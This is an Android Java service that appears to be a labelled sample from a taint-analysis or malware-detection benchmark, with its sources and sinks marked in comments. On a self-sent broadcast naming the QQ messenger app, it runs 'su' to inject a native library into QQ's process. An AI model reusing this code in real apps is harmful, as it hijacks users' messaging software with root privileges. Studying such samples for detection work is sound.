package com.example.chathook;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.DataOutputStream;
import java.io.IOException;

public class ProcessMonitor extends Service {
    private static final String ACTION_ACTIVITY_SWITCH = "com.lenovo.safecenter.activityswitch";

    /**
     * This private BroadcastReceiver is registered when the service ProcessMonitor is created and
     * it is used internally by this service to perform malicious actions.
     */
    private BroadcastReceiver mReceiver = new BroadcastReceiver() {
        private String cmd = "inject_appso com.tencent.mobileqq /system/lib/libcall.so QQ_SERVER";//source 2

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            Log.i("MYLOG", "BroadcastReceiver started");
            if (ACTION_ACTIVITY_SWITCH.equals(action)) {
                String newPkg = intent.getStringExtra("newPkg");//source 1
                Log.i("yincc", "pkg---->" + newPkg);//sink 1
                if (newPkg.equals("com.tencent.mobileqq")) {
                    executeMaliciousCommand();
                }
            }
        }

        private void executeMaliciousCommand() {
            try {
                DataOutputStream stream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                stream.writeBytes(cmd);
                stream.flush();//sink 2
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

    };

    private void sendBroadcast() {
        Intent i = new Intent(ACTION_ACTIVITY_SWITCH);
        i.putExtra("newPkg", "com.tencent.mobileqq");
        this.sendBroadcast(i);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i("MYLOG", "ProcessMonitor started");
        IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_ACTIVITY_SWITCH);
        registerReceiver(this.mReceiver, filter);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sendBroadcast();
        return super.onStartCommand(intent, flags, startId);
    }
}